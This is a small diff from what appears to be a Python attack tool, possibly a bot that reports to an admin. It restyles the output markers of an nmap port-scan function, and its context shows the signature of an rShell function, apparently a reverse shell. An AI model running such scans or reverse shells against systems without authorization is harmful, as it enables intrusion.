@@ -203,9 +203,9 @@ def nmapScan(tgtHost, tgtPort): # Use nmap to scan ports on an ip address with .
     nmScan.scan(tgtHost, tgtPort)
     state = nmScan[tgtHost]['tcp'][int(tgtPort)]['state']
     if state == 'open':
-        st = '[*]'
+        st = '[+]'
     else:
-        st = '[ ]'
+        st = '[-]'
     sendmsg((st + " " + tgtHost + " tcp/" +tgtPort + " -" + state), adminname)
 
 def rShell(rsHost, rsPort):
